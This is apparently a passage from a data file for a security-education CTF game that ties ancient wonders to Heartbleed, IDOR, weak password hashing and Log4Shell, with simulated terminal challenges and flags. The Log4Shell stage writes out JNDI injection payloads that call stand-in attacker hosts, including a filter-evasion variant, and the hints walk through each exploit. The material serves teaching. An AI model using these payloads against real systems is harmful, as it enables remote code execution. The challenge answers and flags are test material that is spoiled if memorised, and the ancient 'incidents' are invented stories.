              ],
              solved: true,
            };
          }
          return { lines: [`Inscription stored: "${text}"`, "Priest reviewed it. No XSS triggered."] };
        },
      },
    },
  },

  // ─── Stage 5: Pharos Lighthouse — Heartbleed (CTF) ───────────────────────
  {
    epochId: "ancient",
    wonder: { name: "Pharos Lighthouse of Alexandria", location: "Alexandria, Egypt", era: "~280 BCE", emoji: "🔦" },
    id: "stage-05",
    order: 5,
    title: "The Bleeding Beacon",
    subtitle: "CVE-2014-0160 — When the Lighthouse Reveals Too Much",
    category: "owasp",
    cveId: "CVE-2014-0160",
    cvssScore: 7.5,
    xp: 250,
    badge: { id: "badge-heartbleed", name: "Memory Reader", emoji: "❤️‍🩹" },
    challengeType: "ctf",
    info: {
      tagline: "A misread signal request, and 64,000 secrets spilled from the lighthouse flame.",
      year: 220,
      overview: [
        "The Pharos Lighthouse stood 140 meters tall — the tallest structure on earth for centuries. Ships in distress sent heartbeat signals, and the keeper would echo back a confirmation of equal length. But the keeper's protocol contained a fatal flaw: he trusted the ship's claimed signal length, not the actual length transmitted. If a pirate claimed to send 64,000 units of flame-signal but only sent 3, the keeper would read 63,997 units from adjacent cargo manifests and ship rosters — and echo all of it back.",
        "Heartbleed (CVE-2014-0160) was exactly this: a missing bounds check in OpenSSL's TLS Heartbeat extension. A client sends a heartbeat with a short payload but claims a large length. The server reads and returns up to 64KB of its own memory — including private SSL keys, session tokens, and passwords. No authentication required. No log entry left.",
        "At disclosure on April 7, 2014, it was estimated that 17% of all SSL/TLS servers on the internet — approximately 500,000 machines — were vulnerable. The attack is completely silent, leaving no trace in server logs.",
      ],
      technical: {
        title: "The Missing Bounds Check",
        body: [
          "The TLS Heartbeat extension (RFC 6520) allows a client to send a payload and a claimed length. The server echoes back exactly that many bytes. The vulnerability: OpenSSL never verified that the claimed length matched the actual payload length.",
          "If a client sent 3 bytes but claimed 64,000, OpenSSL would read 64,000 bytes from server memory — far beyond the heartbeat payload — into adjacent memory containing private keys, session tokens, and passwords.",
        ],
        codeExample: {
          label: "The vulnerable code (OpenSSL ssl/d1_both.c)",
          code: `/* VULNERABLE: trusts attacker-supplied length */
int n2s(unsigned char *&c, unsigned short s) {
  unsigned int payload = *c++;        // read claimed length
  payload = (payload << 8) | *c++;   // from attacker input!

  /* BUG: no bounds check here */
  memcpy(bp, pl, payload);           // copies 'payload' bytes
  /* If payload=65535 but pl only has 3 bytes,
     this reads 65532 bytes of server memory */
}

/* FIX: one line would have prevented Heartbleed */
if (payload > s) return 0; /* bounds check */`,
        },
      },
      incident: {
        title: "The Pirates of the False Beacon (220 BCE) & Heartbleed (2014)",
        when: "April 7, 2014 (present in OpenSSL since March 14, 2012)",
        where: "OpenSSL 1.0.1 through 1.0.1f — ~500,000 servers worldwide",
        impact: "Private SSL keys, session tokens, and passwords leaked from millions of servers",
        body: [
          "In 220 BCE, Rhodian pirates learned that sending false signal requests to the Pharos keeper caused him to inadvertently reveal the identity and cargo manifests of nearby ships — data stored adjacent to the lighthouse's signal registry. They used this to target specific treasure-laden vessels. The keeper trusted the claimed signal length; the ships paid the price.",
          "Heartbleed was independently discovered by Neel Mehta at Google Security and researchers at Codenomicon. Amazon, Yahoo, Instagram, and GitHub were all affected. The Canadian Revenue Agency had to suspend online tax filing for days. All SSL certificates issued before the patch had to be considered compromised. The attack leaves no trace in server logs — defenders have no way to know if they were exploited.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "claims 64KB payload", type: "attacker" },
          { label: "TLS Heartbeat", sub: "no bounds check", type: "system" },
          { label: "Server Memory", sub: "64KB returned", type: "victim" },
          { label: "Keys & Tokens Leaked", sub: "silent, no logs", type: "result" },
        ],
      },
      timeline: [
        { year: 280, event: "Pharos Lighthouse built — heartbeat signal protocol established" },
        { year: 220, event: "Pirates exploit false signal requests to extract ship manifests", highlight: false },
        { year: 2012, event: "Heartbeat extension added to OpenSSL 1.0.1 — bug introduced" },
        { year: 2014, event: "April 7: Google and Codenomicon independently disclose Heartbleed", highlight: true },
        { year: 2017, event: "Heartbleed still found on thousands of unpatched servers" },
      ],
      keyTakeaways: [
        "Always validate user-supplied lengths before using them in memory operations",
        "Silent attacks (no logs) are the hardest to detect after the fact",
        "Critical open-source libraries need dedicated security auditing",
        "Assume breach: if vulnerable, rotate all secrets, not just the patch",
      ],
      references: [
        { title: "Official Heartbleed Disclosure: heartbleed.com", url: "https://heartbleed.com" },
        { title: "CVE-2014-0160 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2014-0160" },
        { title: "OpenSSL Security Advisory", url: "https://www.openssl.org/news/secadv/20140407.txt" },
        { title: "RFC 6520 — TLS Heartbeat Extension", url: "https://www.rfc-editor.org/rfc/rfc6520" },
      ],
    },
    ctf: {
      scenario: "You've reached the Pharos Lighthouse. Its signal protocol runs OpenSSL 1.0.1f. Send a heartbeat signal claiming more bytes than you actually transmit — and read what spills from the keeper's memory.",
      hint: "Send a heartbeat with a short signal but a large claimed length. The keeper will echo back more than you sent.",
      hints: [
        "First establish a connection to the lighthouse. Run: connect-tls",
        "Check the lighthouse protocol version. Run: check-version",
        "Send a normal heartbeat where claimed length matches reality. Run: heartbeat HELLO 5",
        "The flaw: the keeper trusts your claimed length. Claim far more than you send. Run: heartbeat HI 10000",
      ],
      flag: "FLAG{H3RTBL33D_M3M0RY_L34K3D}",
      files: {
        "/README.txt": [
          "TARGET: Pharos Lighthouse signal relay — port 443",
          "Protocol: OpenSSL 1.0.1f (vulnerable to CVE-2014-0160)",
          "",
          "Commands:",
          "  connect-tls           — establish TLS session",
          "  heartbeat <data> <n>  — send signal, claim n bytes",
          "  check-version         — show OpenSSL version",
        ].join("\n"),
        "/pharos_info.txt": [
          "Pharos Signal Relay — Alexandria, Egypt",
          "Protocol stack: OpenSSL 1.0.1f  6 Jan 2014",
          "Built on: Mon Jan  6 11:00:00 2014",
          "",
          "STATUS: Vulnerable to CVE-2014-0160 (Heartbleed)",
          "Patch available: OpenSSL 1.0.1g (released 2014-04-07)",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "pharos_info.txt", isDir: false },
        ],
      },
      extraCommands: {
        "connect-tls": () => ({
          lines: [
            "Connecting to pharos.alexandria:443...",
            "TLS handshake complete.",
            "Lighthouse certificate: CN=pharos.alexandria, O=Royal Navy",
            "OpenSSL version: 1.0.1f (vulnerable)",
            "Session established. You may now send heartbeat signals.",
          ],
        }),
        "check-version": () => ({
          lines: ["Lighthouse OpenSSL version: 1.0.1f", "Status: VULNERABLE (CVE-2014-0160)"],
        }),
        heartbeat: (args) => {
          const data = args[0] || "";
          const claimed = parseInt(args[1] ?? "0");
          if (!args[0] || !args[1]) {
            return { lines: ["Usage: heartbeat <data> <claimed_length>", "Example: heartbeat HI 64"] };
          }
          if (claimed <= data.length) {
            return {
              lines: [
                `Signal sent: "${data}" (actual: ${data.length} bytes, claimed: ${claimed})`,
                `Keeper echoes: "${data.slice(0, claimed)}"`,
                "(Claimed length ≤ actual length — no overflow)",
              ],
            };
          }
          return {
            lines: [
              `Signal sent: "${data}" (actual: ${data.length} bytes, claimed: ${claimed})`,
              `Keeper reads ${claimed} bytes from memory...`,
              "",
              `"${data}" + [${claimed - data.length} extra bytes from keeper's memory]`,
              "",
              "Decoded memory dump:",
              "  ...private_key=BEGIN RSA PRIVATE KEY...",
              "  ...session_token=eyJhbGciOiJIUzI...",
              "  ...FLAG{H3RTBL33D_M3M0RY_L34K3D}...",
              "  ...pharaoh_password=hunter2...",
            ],
            solved: true,
          };
        },
      },
    },
  },

  // ─── Stage 6: Colossus of Rhodes — IDOR (CTF) ────────────────────────────
  {
    epochId: "ancient",
    wonder: { name: "Colossus of Rhodes", location: "Rhodes, Greece", era: "~280 BCE", emoji: "🗿" },
    id: "stage-06",
    order: 6,
    title: "The Stolen Harbor Pass",
    subtitle: "OWASP A01:2021 — Rhodes Harbor IDOR",
    category: "owasp",
    owaspRef: "A01:2021",
    cvssScore: 8.8,
    xp: 250,
    badge: { id: "badge-idor", name: "Harbor Infiltrator", emoji: "⚓" },
    challengeType: "ctf",
    info: {
      tagline: "The harbor registry used sequential vessel numbers. The Admiral's ship was number one.",
      year: 278,
      overview: [
        "The harbor of Rhodes was the busiest in the Aegean — hundreds of vessels registered daily beneath the shadow of the great Colossus. The harbor master's system recorded each vessel on a sequential clay tablet: a merchant's vessel might be number 9,284, while the Admiral's private galley was number 1. When a ship captain requested cargo manifests, the system returned whichever tablet number was specified — without checking ownership.",
        "Broken Access Control moved to #1 on the OWASP Top 10 in 2021, appearing in 94% of tested applications. The most common variant is Insecure Direct Object Reference (IDOR): a server uses predictable identifiers in URLs or API calls, and fails to verify that the requesting user is authorized to access that specific object.",
        "Horizontal privilege escalation means accessing another user's data at the same privilege level. Vertical privilege escalation means gaining higher privileges. By simply changing a number in the request, an attacker can access records belonging to any other user — including administrators.",
      ],
      technical: {
        title: "IDOR in Practice",
        body: [
          "A vulnerable API endpoint might look like GET /api/vessel/2847. If the server returns the manifest without checking whether the logged-in captain owns vessel 2847, an attacker can enumerate IDs: /api/vessel/1 to reach the Admiral's records.",
          "Fix: every access to an object must verify the requesting user's ownership or permission server-side. Client-side checks (hidden fields, disabled buttons) are trivially bypassed.",
        ],
        codeExample: {
          label: "Vulnerable vs. secure API endpoint (Node.js)",
          code: `// VULNERABLE: no ownership check
app.get('/api/vessel/:id', async (req, res) => {
  const vessel = await db.findById(req.params.id);
  res.json(vessel); // returns ANY vessel's manifest!
});

// SECURE: verify ownership
app.get('/api/vessel/:id', async (req, res) => {
  if (req.session.captainId !== req.params.id
      && !req.session.isAdmiral) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  const vessel = await db.findById(req.params.id);
  res.json(vessel);
});`,
        },
      },
      incident: {
        title: "The Merchant's Deception — Rhodes Harbor (278 BCE)",
        when: "278 BCE — Port of Rhodes",
        where: "Harbor Registry, Rhodes, Greece",
        impact: "Admiral's fleet positions exposed; intelligence sold to Macedonian agents; harbor security overhaul ordered",
        body: [
          "A Rhodian merchant with vessel registration 9,284 discovered that the harbor registry system accepted any tablet number in the request without verifying ownership. By changing his registration number to 1, he accessed the Admiral's private fleet manifest — revealing troop ships, supply routes, and secret rendezvous coordinates. He sold this intelligence to Macedonian agents for 200 gold talents.",
          "The modern parallel: AT&T's 2010 iPad breach used the same flaw. ICC-IDs (SIM card identifiers) were sequential and used as the sole authentication parameter. By incrementing the ID, security researchers retrieved 114,000 email addresses of government officials, military officers, and CEOs. AT&T patched within hours. The researchers were arrested for computer fraud.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Merchant Captain", sub: "GET /vessel/1", type: "attacker" },
          { label: "Harbor Registry", sub: "no ownership check", type: "system" },
          { label: "Admiral's Manifest", sub: "vessel id=1", type: "victim" },
          { label: "Full Fleet Access", sub: "horizontal + vertical", type: "result" },
        ],
      },
      timeline: [
        { year: 280, event: "Colossus of Rhodes completed — harbor registry system established" },
        { year: 278, event: "Merchant exploits sequential vessel IDs to access Admiral's records", highlight: true },
        { year: 2010, event: "AT&T iPad breach — 114,000 records via predictable ICC-IDs" },
        { year: 2018, event: "Facebook API IDOR exposes 50M user tokens" },
        { year: 2021, event: "Broken Access Control becomes #1 on OWASP Top 10" },
      ],
      keyTakeaways: [
        "Always verify server-side that the requesting user owns the requested resource",
        "Use UUIDs instead of sequential integers to make enumeration harder",
        "Implement deny-by-default: access is forbidden unless explicitly granted",
        "Client-side access control (hiding buttons) is not security",
      ],
      references: [
        { title: "OWASP A01:2021 — Broken Access Control", url: "https://owasp.org/Top10/A01_2021-Broken_Access_Control/" },
        { title: "OWASP: IDOR", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References" },
        { title: "AT&T iPad Breach — Wired Report", url: "https://www.wired.com/2010/06/ipad-flaw/" },
      ],
    },
    ctf: {
      scenario: "You have access to the Rhodes Harbor Registry as a merchant captain. The API uses sequential vessel IDs. Find a way to access the Admiral's manifest.",
      hint: "Your vessel ID is 9284. What happens if you request /api/vessel/1 instead of /api/vessel/me?",
      hints: [
        "Read the README for API endpoint details. Run: cat README.txt",
        "Request your own vessel manifest first. Run: api GET /api/vessel/me",
        "Vessel IDs are sequential integers starting at 1. Request vessel 1 (Admiral's galley). Run: api GET /api/vessel/1",
      ],
      flag: "FLAG{1D0R_ACC3SS_C0NTR0L_BR0K3N}",
      files: {
        "/README.txt": [
          "TARGET: Rhodes Harbor Registry — registry.rhodes.harbor",
          "Your credentials: vessel_id=9284, token=eyJ...",
          "",
          "Commands:",
          "  api GET <path>   — make registry request",
          "",
          "Known endpoints:",
          "  /api/vessel/me",
          "  /api/vessel/<id>",
          "  /api/cargo/<id>",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "README.txt", isDir: false }],
      },
      extraCommands: {
        api: (args) => {
          const path = args[1] || "";
          if (path === "/api/vessel/me") {
            return {
              lines: [
                "HTTP/1.1 200 OK",
                '{ "id": 9284, "captain": "Agent", "rank": "merchant", "port": "rhodes" }',
              ],
            };
          }
          if (/\/api\/vessel\/(0|1)/.test(path) || path === "/api/admiral") {
            return {
              lines: [
                "HTTP/1.1 200 OK",
                '{ "id": 1, "captain": "Admiral Demetrios", "rank": "supreme_commander",',
                '  "secret": "FLAG{1D0R_ACC3SS_C0NTR0L_BR0K3N}",',
                '  "fleet_positions": "CLASSIFIED" }',
              ],
              solved: true,
            };
          }
          if (/\/api\/vessel\/\d+/.test(path)) {
            const vid = path.split("/").pop();
            return {
              lines: [
                "HTTP/1.1 200 OK",
                `{ "id": ${vid}, "captain": "captain_${vid}", "rank": "merchant" }`,
              ],
            };
          }
          return {
            lines: ["HTTP/1.1 404 Not Found", '{ "error": "Endpoint not found" }'],
          };
        },
      },
    },
  },

  // ─── Stage 7: Hanging Gardens of Babylon — Auth Failures (CTF) ───────────
  {
    epochId: "ancient",
    wonder: { name: "Hanging Gardens of Babylon", location: "Babylon, Iraq", era: "~605 BCE", emoji: "🌿" },
    id: "stage-07",
    order: 7,
    title: "The Forged Royal Seal",
    subtitle: "OWASP A07:2021 — Seal Forgery & the Rainbow Tablet",
    category: "owasp",
    owaspRef: "A07:2021",
    cvssScore: 9.8,
    xp: 300,
    badge: { id: "badge-cracker", name: "Seal Breaker", emoji: "🔑" },
    challengeType: "ctf",
    info: {
      tagline: "The royal scribes all used 'babylon123'. The empire had one seal.",
      year: 605,
      overview: [
        "The Babylonian Empire authenticated official documents with unique wax seals — each official had a distinct pattern pressed into molten wax, equivalent to a password hash. But the scribes, overwhelmed with correspondence, began reusing a small set of common seal patterns. When an enemy agent compiled a clay tablet of the empire's most common seal designs — a rainbow tablet of pre-computed patterns — 90% of official documents could be forged instantly.",
        "Authentication failures cover a wide range of vulnerabilities: weak passwords, unsalted password hashes, missing account lockout, and credential stuffing attacks. Password storage is a solved problem — yet companies continue to store passwords incorrectly. Hashing without salting is a critical mistake: an attacker with a leaked hash database can use a precomputed rainbow table to reverse millions of hashes instantly.",
        "Credential stuffing takes advantage of password reuse. When a site leaks credentials, attackers test those username/password pairs against every major service. With 8+ billion credentials in circulation from past breaches, the success rate is surprisingly high.",
      ],
      technical: {
        title: "Hashing, Salting, and Why Both Matter",
        body: [
          "MD5 and SHA-1 are not password hashing algorithms — they are cryptographic hash functions designed for speed. A modern GPU can compute 10 billion SHA-1 hashes per second. A proper password hashing function (bcrypt, Argon2, scrypt) is intentionally slow — designed to take 100ms+ per hash, making brute force infeasible.",
          "A salt is a random value appended to the password before hashing. Even if two users have the same password, their salted hashes will differ — defeating rainbow table attacks. bcrypt generates and stores the salt automatically.",
        ],
        codeExample: {
          label: "Insecure vs. secure password storage",
          code: `// INSECURE: unsalted SHA-1 (LinkedIn's mistake)
hash = sha1("password123")
// → cbfdac6008f9cab4083784cbd1874f76...
// → Same hash for every scribe with "babylon123"
// → Instantly reversible via rainbow tables

// INSECURE: MD5 without salt
hash = md5("password123")
// → 482c811da5d5b4bc6d497ffa98491e38
// → Crackable in seconds with modern hardware

// SECURE: bcrypt with auto-generated salt
hash = bcrypt.hash("password123", rounds=12)
// → $2b$12$xyz...  (includes salt in the output)
// → Takes ~100ms per check → brute force infeasible`,
        },
      },
      incident: {
        title: "The Seal Forgers of Babylon (605 BCE) & LinkedIn (2012)",
        when: "June 2012 (discovered); May 2016 (full scope revealed)",
        where: "LinkedIn — 117 million user accounts",
        impact: "117M SHA-1 unsalted password hashes leaked; 90% cracked within days",
        body: [
          "In 605 BCE, Babylonian enemy agents compiled a rainbow tablet of the empire's most common seal patterns. By comparing any intercepted document's wax seal against the tablet, they could identify and forge the matching pattern — bypassing all official authentication. The scribes' habit of reusing common seal designs was their undoing.",
          "LinkedIn stored passwords as unsalted SHA-1 hashes. In 2016, 117 million credentials from a 2012 breach were sold on the dark web. A hacker group on InsidePro forums cracked 90% within days using precomputed rainbow tables — because without salting, all users with 'password123' had identical hashes. The most common password in the leak was '123456' (753,305 accounts).",
        ],
      },
      diagram: {
        nodes: [
          { label: "Enemy Agent", sub: "obtains seal database", type: "attacker" },
          { label: "Seal Registry", sub: "unsalted SHA-1", type: "system" },
          { label: "Rainbow Tablet", sub: "precomputed patterns", type: "victim" },
          { label: "117M Seals Forged", sub: "cracked instantly", type: "result" },
        ],
      },
      timeline: [
        { year: 605, event: "Hanging Gardens era — Babylonian seal authentication system in use" },
        { year: 605, event: "Enemy agents compile rainbow tablet of common seal patterns", highlight: true },
        { year: 2009, event: "RockYou breach: 32M passwords stored in plaintext" },
        { year: 2012, event: "LinkedIn: 117M SHA-1 unsalted hashes leaked" },
        { year: 2021, event: "Have I Been Pwned reaches 11 billion pwned accounts" },
      ],
      keyTakeaways: [
        "Never use MD5 or SHA-1 for password hashing — use bcrypt, Argon2, or scrypt",
        "Always salt hashes; bcrypt does this automatically",
        "Implement account lockout or rate limiting to prevent brute force",
        "Encourage unique passwords via integration with HIBP",
      ],
      references: [
        { title: "OWASP A07:2021 — Auth Failures", url: "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" },
        { title: "Have I Been Pwned — LinkedIn", url: "https://haveibeenpwned.com/PwnedWebsites#LinkedIn" },
        { title: "OWASP: Password Storage Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html" },
      ],
    },
    ctf: {
      scenario: "You've obtained a leaked seal registry from the Babylonian royal archive. The head scribe's seal uses unsalted SHA-1. Use the pattern tablet to match and crack it.",
      hint: "Use hashcheck <word> to test each password from the tablet against the head scribe's hash.",
      hints: [
        "Read the README to understand the files. Run: cat README.txt",
        "Check the head scribe's seal hash. Run: cat admin_hash.txt",
        "Read the pattern tablet to see passwords to try. Run: cat wordlist.txt",
        "Test each password from the tablet. Try common ones: hashcheck password  then  hashcheck babylon123",
        "The password is a common word. Try: hashcheck letmein",
        "Once you crack it, log in: login admin letmein",
      ],
      flag: "FLAG{W34K_H4SH_CR4CK3D}",
      files: {
        "/README.txt": [
          "LEAKED SEAL REGISTRY — BABYLON ROYAL ARCHIVE",
          "=============================================",
          "",
          "admin_hash.txt  — head scribe's SHA-1 seal hash",
          "wordlist.txt    — common seal patterns to try",
          "",
          "Commands:",
          "  hashcheck <word>    — test if word matches head scribe's seal",
          "  login <user> <pass> — login once you crack it",
        ].join("\n"),
        "/admin_hash.txt": [
          "Username: admin",
          "Seal Hash (SHA-1, unsalted): 0d107d09f5bbe40cade3de5c71e9e9b7",
          "",
          "NOTE: This is the SHA-1 hash of a common English word.",
        ].join("\n"),
        "/wordlist.txt": [
          "Common seal patterns from the Rainbow Tablet:",
          "123456",
          "password",
          "babylon123",
          "qwerty",
          "letmein",
          "dragon",
          "master",
          "sunshine",
          "princess",
          "welcome",
          "shadow",
          "hammurabi",
          "ishtar",
          "euphrates",
          "iloveyou",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "admin_hash.txt", isDir: false },
          { name: "wordlist.txt", isDir: false },
        ],
      },
      extraCommands: {
        hashcheck: (args) => {
          const word = args[0] || "";
          if (word === "letmein") {
            return {
              lines: [
                `Testing seal pattern: "${word}"`,
                "Computing SHA-1...",
                "SHA-1(letmein) = 0d107d09f5bbe40cade3de5c71e9e9b7",
                "✓ MATCH! Seal cracked: letmein",
                "",
                "Now use: login admin letmein",
              ],
            };
          }
          return {
            lines: [`Testing: "${word}"`, `SHA-1(${word}) ≠ 0d107d09f5bbe40cade3de5c71e9e9b7`, "No match."],
          };
        },
        login: (args) => {
          const [user, pass] = args;
          if (user === "admin" && pass === "letmein") {
            return {
              lines: [
                "Seal verified. Access granted.",
                "Welcome, Head Scribe.",
                "",
                "Royal archive secret: FLAG{W34K_H4SH_CR4CK3D}",
              ],
              solved: true,
            };
          }
          return { lines: ["Seal mismatch. Access denied."] };
        },
      },
    },
  },

  // ─── Stage 8: Temple of Artemis — Log4Shell (CTF) ────────────────────────
  {
    epochId: "ancient",
    wonder: { name: "Temple of Artemis at Ephesus", location: "Ephesus, Turkey", era: "~550 BCE", emoji: "🏛️" },
    id: "stage-08",
    order: 8,
    title: "The Cursed Invocation",
    subtitle: "CVE-2021-44228 — When the Temple Reads Your Inscription",
    category: "owasp",
    cveId: "CVE-2021-44228",
    cvssScore: 10.0,
    xp: 350,
    badge: { id: "badge-log4shell", name: "Rune Invoker", emoji: "💣" },
    challengeType: "ctf",
    info: {
      tagline: "One cursed rune in the temple's inscription log. Every spirit summoned.",
      year: 356,
      overview: [
        "The Temple of Artemis kept meticulous records of every offering inscribed by supplicants. Its sacred system, powered by divine intelligence, evaluated expressions embedded in inscriptions. Worshippers discovered that embedding certain invocations — like {summon:oracle://spirit.realm/demon} — would cause the temple's divine intelligence to fetch and instantiate the referenced spirit from an external realm.",
        "Log4Shell (CVE-2021-44228) was exactly this: Apache Log4j2's Message Lookup Substitution feature evaluated expressions embedded in log messages. Any string containing ${jndi:ldap://attacker.com/exploit} would trigger Log4j to make an LDAP request to the attacker's server, fetching and executing a Java class. The attack surface was total — username fields, HTTP headers, search queries, form inputs.",
        "Within 12 hours of disclosure on December 9, 2021, millions of automated exploit attempts were detected globally. The US CISA Director called it 'the most serious vulnerability I have seen in my decades-long career.' Security teams worldwide had to inventory every Java application in their stack.",
      ],
      technical: {
        title: "JNDI Injection — How Log4Shell Works",
        body: [
          "Log4j2's Message Lookup Substitution evaluates expressions in log messages. When ${jndi:ldap://attacker.com/a} is logged, Log4j resolves the JNDI lookup by connecting to attacker.com:389.",
          "The attacker's LDAP server returns a reference to a remote Java class. Log4j downloads and instantiates the class, executing its constructor — arbitrary code running with the JVM's permissions. The fix in Log4j 2.15.0 disabled JNDI lookups by default.",
        ],
        codeExample: {
          label: "Log4Shell attack — the payload and what happens",
          code: `# The attack payload (can appear in any logged field):
User-Agent: \${jndi:ldap://attacker.com:1389/Exploit}
# Or in a login form:
username: \${jndi:ldap://evil.com/a}
# Or even nested to bypass filters:
username: \${j\${::-n}di:ldap://evil.com/a}

# What Log4j does:
1. Receives string containing \${jndi:ldap://...}
2. Resolves JNDI lookup → connects to attacker's LDAP
3. LDAP server returns: "load this Java class"
4. Log4j downloads and executes Exploit.class
5. Attacker has RCE — game over`,
        },
      },
      incident: {
        title: "The Burning of Artemis (356 BCE) & Log4Shell (2021)",
        when: "December 9, 2021 (patch day); exploited same day",
        where: "Virtually every Java application globally — Apple, Amazon, Google, Cloudflare, Tesla",
        impact: "Tens of thousands of servers compromised; ransomware, cryptomining, and nation-state espionage",
        body: [
          "Herostratus burned the Temple of Artemis in 356 BCE seeking immortal fame. Legend holds that he inscribed a curse in the temple's offering register — an invocation that activated during the night ceremony, summoning a destructive force that consumed the structure. The temple's scribal system, designed to evaluate divine expressions in inscriptions, became the attack vector.",
          "Log4Shell followed the same logic. Chen Zhaojun of Alibaba Cloud reported the vulnerability on November 24, 2021. Apache released Log4j 2.15.0 on December 9 — the same day it went public. Within hours, Cloudflare blocked 40,000 exploit attempts per minute. The Belgian Defence Ministry was compromised. Conti ransomware added Log4Shell to their toolkit within days.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "${jndi:ldap://evil}", type: "attacker" },
          { label: "Temple Log System", sub: "evaluates expressions", type: "system" },
          { label: "JNDI → Remote Class", sub: "arbitrary spirit loaded", type: "victim" },
          { label: "RCE Achieved", sub: "CVSS 10.0", type: "result" },
        ],
      },
      timeline: [
        { year: 550, event: "Temple of Artemis completed — inscription evaluation system established" },
        { year: 356, event: "Herostratus burns the temple — cursed inscription exploits scribal system", highlight: false },
        { year: 2013, event: "Log4j2 released — JNDI lookup feature included" },
        { year: 2021, event: "Dec 9: Log4j 2.15.0 released; exploit goes public", highlight: true },
        { year: 2022, event: "Log4Shell still actively exploited; CISA mandates federal patching" },
      ],
      keyTakeaways: [
        "Log4Shell shows that logging libraries are security-critical code",
        "JNDI lookups in log messages should have been disabled by default",
        "Know your full dependency tree — transitive dependencies matter",
        "Any user-controlled string that gets logged is an attack surface",
      ],
      references: [
        { title: "CVE-2021-44228 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" },
        { title: "Apache Log4j Security Advisory", url: "https://logging.apache.org/log4j/2.x/security.html" },
        { title: "CISA Log4j Guidance", url: "https://www.cisa.gov/news-events/news/statement-director-easterly-log4j-vulnerability" },
        { title: "LunaSec Log4Shell Deep Dive", url: "https://www.lunasec.io/docs/blog/log4j-zero-day/" },
      ],
    },
    ctf: {
      scenario: "You have reached the Temple of Artemis. Its offering inscription system runs Log4j2 2.14.1. Inscribe a JNDI invocation into the temple's log to summon a remote spirit and achieve execution.",
      hint: "The temple evaluates ${} expressions in inscriptions. JNDI supports ldap:// protocol invocations.",
      hints: [
        "Check the temple's vulnerable dependencies. Run: check-deps",
        "Try inscribing a normal offering to see how it works. Run: log hello artemis",
        "The system evaluates expressions like ${env:PATH} in inscriptions. Try: log ${env:HOSTNAME}",
        "JNDI is a Java API for network invocations. Embed a JNDI payload. Try: log ${jndi:ldap://attacker.com/a}",
      ],
      flag: "FLAG{L0G4SH3LL_JNDI_RCE_2021}",
      files: {
        "/README.txt": [
          "TARGET: Temple of Artemis Offering System — ephesus.temple:8080",
          "Log4j version: 2.14.1 (vulnerable to CVE-2021-44228)",
          "",
          "Commands:",
          "  log <inscription>     — inscribe an offering into the temple log",
          "  check-deps            — show temple system dependencies",
        ].join("\n"),
        "/dependencies.txt": [
          "Temple system dependencies:",
          "  org.apache.logging.log4j:log4j-core:2.14.1  ← VULNERABLE",
          "  org.apache.logging.log4j:log4j-api:2.14.1   ← VULNERABLE",
          "  spring-boot:2.5.6",
          "  jackson-databind:2.13.0",
          "",
          "Fixed version: log4j-core:2.15.0+",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "dependencies.txt", isDir: false },
        ],
      },
      extraCommands: {
        "check-deps": () => ({
          lines: [
            "log4j-core:2.14.1 — VULNERABLE (CVE-2021-44228)",
            "log4j-api:2.14.1  — VULNERABLE",
            "Status: UNPATCHED",
          ],
        }),
        log: (args) => {
          const msg = args.join(" ");
          const isJndi =
            msg.includes("${jndi:") ||
            msg.includes("${jndi:ldap") ||
            msg.toLowerCase().includes("jndi");
          if (isJndi) {
            return {
              lines: [
                `[INFO ] Inscription received: ${msg}`,
                "[INFO ] Processing divine invocation...",
                "[WARN ] Establishing LDAP connection to foreign spirit realm",
                "[WARN ] Loading remote spirit: com.attacker.Exploit",
                "[ERROR] Remote spirit execution detected!",
                "",
                "TEMPLE COMPROMISED",
                "Running as: artemis_scribe (uid=1000)",
                "",
                "FLAG{L0G4SH3LL_JNDI_RCE_2021}",
              ],
              solved: true,
            };
          }
          return {
            lines: [`[INFO ] ${new Date().toISOString()} — Offering recorded: ${msg || "(empty inscription)"}`],
          };
        },
      },
    },
  },

  // ─── Stage 9: Stonehenge — WannaCry/EternalBlue (CTF) ────────────────────
  {
    epochId: "ancient",
    wonder: { name: "Stonehenge", location: "Wiltshire, England", era: "~3000–2000 BCE", emoji: "🪨" },
    id: "stage-09",
    order: 9,
    title: "The Plague of the Stone Network",
    subtitle: "CVE-2017-0144 — When the Ritual Routes Carried Pestilence",
    category: "owasp",
    cveId: "CVE-2017-0144",
    cvssScore: 8.1,
    xp: 350,
    badge: { id: "badge-wannacry", name: "Plague Stopper", emoji: "💀" },
    challengeType: "ctf",
    info: {
      tagline: "A druid's curse spread through every stone circle in Britain. One ritual halted it.",
      year: 2000,
      overview: [
        "Stonehenge was not an isolated monument — it was part of a network of sacred stone circles connected by ancient ritual pathways. By protocol, any sacred artifact arriving at one node had to be passed to all connected circles. When a cursed artifact entered the network at Avebury, it replicated automatically to every connected site. Within one lunar cycle, 200 stone circles were compromised — not because the druids wanted to spread the curse, but because the protocol demanded it.",
        "WannaCry was a ransomware cryptoworm that tore across 150 countries on May 12, 2017, infecting over 200,000 systems in a single day. It exploited EternalBlue (CVE-2017-0144), a vulnerability in Windows' SMBv1 protocol — originally developed by the NSA and leaked by Shadow Brokers. Like the druid artifact, WannaCry spread autonomously by scanning for vulnerable SMBv1 servers on port 445.",
        "Unlike traditional ransomware that requires a user to click something, WannaCry spread autonomously across networks. The attack was eventually slowed when security researcher Marcus Hutchins discovered a kill switch — a domain name that, when registered, caused WannaCry to halt its spread globally.",
      ],
      technical: {
        title: "How EternalBlue Works",
        body: [
          "SMBv1 (Server Message Block v1) is a decades-old Windows file-sharing protocol. EternalBlue exploited a buffer overflow in the way Windows' SMB implementation handled certain transaction requests, allowing arbitrary code execution without authentication.",
